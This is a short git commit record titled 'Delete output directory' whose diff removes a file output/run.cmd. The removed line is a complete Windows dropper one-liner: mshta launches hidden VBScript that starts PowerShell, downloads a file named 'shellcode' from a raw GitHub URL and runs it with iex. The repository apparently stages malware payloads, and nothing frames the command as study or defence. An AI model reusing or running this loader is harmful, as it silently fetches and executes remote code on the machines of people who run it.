9dea3cdac45b3cb5e89e719e0b478674605704b1
43a1723 <hai1723notgay@gmail.com>
2024-09-21 11:43:04 +0700

    Delete output directory

--- output/run.cmd
+++
@@ -1,1 +0,0 @@
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/output/shellcode' -UseBasicParsing; iex $t",0))
